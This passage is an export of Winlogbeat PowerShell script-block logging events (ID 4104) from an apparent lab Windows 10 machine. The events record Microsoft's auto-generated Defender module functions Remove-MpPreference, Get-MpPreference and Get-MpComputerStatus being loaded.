        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleOffset')) {
          [object]$__cmdletization_value = ${ScanScheduleOffset}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableTDTFeature')) {
          [object]$__cmdletization_value = ${DisableTDTFeature}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Force')) {
          [object]$__cmdletization_value = ${Force}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-MpPreference' -Alias '*'
        

function Get-MpPreference
{
    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root\Microsoft\Windows\Defender\MSFT_MpPreference')]

    param(
    
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [int]
    ${ThrottleLimit},

    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper 

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","s = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableGradualRelease')) {
          [object]$__cmdletization_value = ${DisableGradualRelease}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionDownLevel')) {
          [object]$__cmdletization_value = ${AllowNetworkProtectionDownLevel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowDatagramProcessingOnWinServer')) {
          [object]$__cmdletization_value = ${AllowDatagramProcessingOnWinServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableDnsSinkhole')) {
          [object]$__cmdletization_value = ${EnableDnsSinkhole}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableInboundConnectionFiltering')) {
          [object]$__cmdletization_value = ${DisableInboundConnectionFiltering}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRdpParsing')) {
          [object]$__cmdletization_value = ${DisableRdpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableNetworkProtectionPerfTelemetry')) {
          [object]$__cmdletization_value = ${DisableNetworkProtectionPerfTelemetry}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('TrustLabelProtectionStatus')) {
          [object]$__cmdletization_value = ${TrustLabelProtectionStatus}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowSwitchToAsyncInspection')) {
          [object]$__cmdletization_value = ${AllowSwitchToAsyncInspection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleOffset')) {
          [object]$__cmdletization_value = ${ScanScheduleOffset}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableTDTFeature')) {
          [object]$__cmdletization_value = ${DisableTDTFeature}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Force')) {
          [object]$__cmdletization_value = ${Force}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-MpPreference' -Alias '*'
        

function Get-MpPreference
{
    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root\Microsoft\Windows\Defender\MSFT_MpPreference')]

    param(
    
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [int]
    ${ThrottleLimit},

    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper ",19,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3348,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",cnkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.649","Oct 23, 2022 @ 17:00:34.213",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (20 of 20):
= $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-MpPreference' -Alias '*'
        


ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","= $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-MpPreference' -Alias '*'
        ",20,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3349,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.127",XnkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.199",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpComputerStatus'
$script:ClassVersion = ''
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-MpComputerStatus
{
    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\Microsoft\Windows\Defender\MSFT_MpComputerStatus')]

    param(
    
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [int]
    ${ThrottleLimit},

    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpComputerStatus.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-MpComputerStatus' -Alias '*'
        


ScriptBlock ID: 7d63c58f-9dc3-4665-9913-c84f2a838406
Path: ","7d63c58f-9dc3-4665-9913-c84f2a838406","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpComputerStatus'
$script:ClassVersion = ''
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-MpComputerStatus
{
    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\Microsoft\Windows\Defender\MSFT_MpComputerStatus')]

    param(
    
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [int]
    ${ThrottleLimit},

    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpComputerStatus.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-MpComputerStatus' -Alias '*'
        ",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-f7d2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3329,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
